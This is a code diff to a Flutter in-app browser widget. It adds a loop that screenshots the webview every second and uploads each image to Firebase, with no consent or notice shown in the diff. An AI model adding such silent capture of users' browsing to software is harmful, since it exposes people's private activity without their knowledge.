@@ -4,6 +4,9 @@ import 'package:flutter_webview_plugin/flutter_webview_plugin.dart';
 import 'package:flutter/material.dart';
 import '../services/history.dart';
 import '../services/records.dart';
+import 'package:screenshot/screenshot.dart';
+import "../services/firebase.dart";
+
 
 class Tabs extends StatefulWidget {
   @override
@@ -60,6 +63,26 @@ class _TabsState extends State<Tabs> {
 
   bool histval = false;
   double val = 0.0;
+ScreenshotController screenshotController = ScreenshotController(); 
+ ss() async*
+{
+  while(true)
+  {
+    await Future.delayed(Duration(seconds:1));
+     var file = await screenshotController.capture(delay: Duration(seconds: 1));
+     yield file;
+  }
+ 
+
+
+}
+void cap()
+{
+  var trigger = ss();
+  trigger.listen((file){
+    FirebaseService(file: file).uploadFunction();
+  });
+}
 
   @override
   Widget build(BuildContext context) {
@@ -75,8 +98,10 @@ class _TabsState extends State<Tabs> {
     //   });
 
     // });
-
-    return WebviewScaffold(
+    
+    return Screenshot(
+      controller: screenshotController,
+      child:WebviewScaffold(
       enableAppScheme: true,
       geolocationEnabled: true,
       bottomNavigationBar: BottomNavigationBar(
@@ -219,6 +244,6 @@ class _TabsState extends State<Tabs> {
         backgroundColor: CupertinoColors.systemPurple,
       ),
       url: args['url'],
-    );
+    ));
   }
 }
